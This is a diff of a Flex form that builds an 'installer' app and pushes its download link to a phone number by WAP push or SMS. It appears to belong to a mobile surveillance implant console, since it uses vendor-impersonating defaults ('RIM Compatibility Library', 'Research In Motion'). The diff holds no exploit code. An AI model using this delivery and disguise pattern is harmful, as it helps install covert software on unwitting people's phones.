@@ -15,6 +15,7 @@
       
       import mx.collections.ListCollectionView;
       import mx.core.UIComponent;
+      import mx.events.ValidationResultEvent;
       import mx.managers.PopUpManager;
       import mx.rpc.events.FaultEvent;
       import mx.rpc.events.ResultEvent;
@@ -97,15 +98,33 @@
       
       private function collName(o:Object):String
       {
-        // TODO: instead of this check, filter only valid collectors
-        if (o != null && o['address'] != '')
+        if (o == null)
+          return 'invalid address';
+        
+        if (o.hasOwnProperty('address') && o['address'] != '')
           return "http://" + o['address']  + '/';
         
-        return 'invalid address';
+        return o.toString();
       }
       
       protected function send():void
       {        
+
+        if (number.text.length == 0) {
+          AlertPopUp.show(R.get('MISSING_NUMBER'), R.get('ERROR'));
+          return;
+        }
+
+        if (url.textInput.text.length == 0) {
+          AlertPopUp.show(R.get('MISSING_URL'), R.get('ERROR'));
+          return;
+        }
+
+        if (appname.text.length == 0) {
+          AlertPopUp.show(R.get('MISSING_APPLICATION'), R.get('ERROR'));
+          return;
+        }
+
         params = {platform: 'wap', deliver: {}, generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, melt: { appname: appname.text }, sign: {} } };
         
         if (currentState == 'blackberry') {
@@ -124,8 +143,16 @@
         }
         
         params['deliver']['number'] = number.text;
-        params['deliver']['url'] = url.selectedItem + appname.text;
-        params['deliver']['service'] = servindication.selected ? 'indication' : 'loading';
+        params['deliver']['link'] = url.textInput.text + appname.text;
+        
+        if (servindication.selected)
+          params['deliver']['type'] = 'si';
+        if (servloading.selected)
+          params['deliver']['type'] = 'sl';
+        if (sms.selected)
+          params['deliver']['type'] = 'sms';
+          
+        params['deliver']['text'] = text.text;
         params['factory'] = {_id: parentDocument.factory._id};
         
         DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
@@ -146,7 +173,7 @@
   <fx:Declarations>
     <s:RadioButtonGroup id="Service"/>
   </fx:Declarations>
-  
+    
   <s:states>
     <s:State name='all'/>
     <s:State name='multiplatform'/>
@@ -159,7 +186,7 @@
       <s:TextInput id="appname" text="installer"/>
     </s:FormItem>
     <s:FormItem label="Phone Number">    
-      <s:TextInput id="number" text=""/>
+      <s:TextInput id="number" text="" restrict="0-9"/>
     </s:FormItem>
     <s:FormItem label="URL">    
       <s:ComboBox id="url" dataProvider="{urls}" labelFunction="collName" selectedIndex="0"/>
@@ -168,19 +195,20 @@
       <s:HGroup>
         <s:RadioButton id="servloading" label="Loading" groupName="Service" selected="true"/>
         <s:RadioButton id="servindication" label="Indication" groupName="Service"/>
+        <s:RadioButton id="sms" label="SMS" groupName="Service"/>
       </s:HGroup>
     </s:FormItem>
-    <s:FormItem label="Description" visible="{servindication.selected}">    
-      <s:TextInput text=""/>
+    <s:FormItem label="Text" enabled="{!servloading.selected}">    
+      <s:TextInput id="text" text="" width="180"/>
     </s:FormItem>
   </s:Form>
   
-  <s:Form includeIn="blackberry" left="10" top="135">
+  <s:Form includeIn="blackberry" left="10" top="180">
     <s:FormItem label="Name">    
       <s:TextInput id="nameForm" text="RIM Compatibility Library" width="150"/>
     </s:FormItem>
     <s:FormItem label="Description">        
-      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="200"/>
+      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="210"/>
     </s:FormItem>
     <s:FormItem label="Vendor">       
       <s:TextInput id="vendorForm" text="Research In Motion" width="150"/>
@@ -190,9 +218,9 @@
     </s:FormItem>
   </s:Form>
   
-  <s:Form includeIn="symbian" left="10" top="135">
+  <s:Form includeIn="symbian" left="10" top="180">
     <s:FormItem label="Certificate bound to phone IMEI">    
-      <s:Button width="80" label="{R.get('BROWSE')}" click="browse()"/>
+      <s:Button width="80" label="{R.get('BROWSE')}..." click="browse()"/>
     </s:FormItem>
     <s:FormItem label="S60 Edition">
       <s:DropDownList id="edition" selectedIndex="0" width="80">
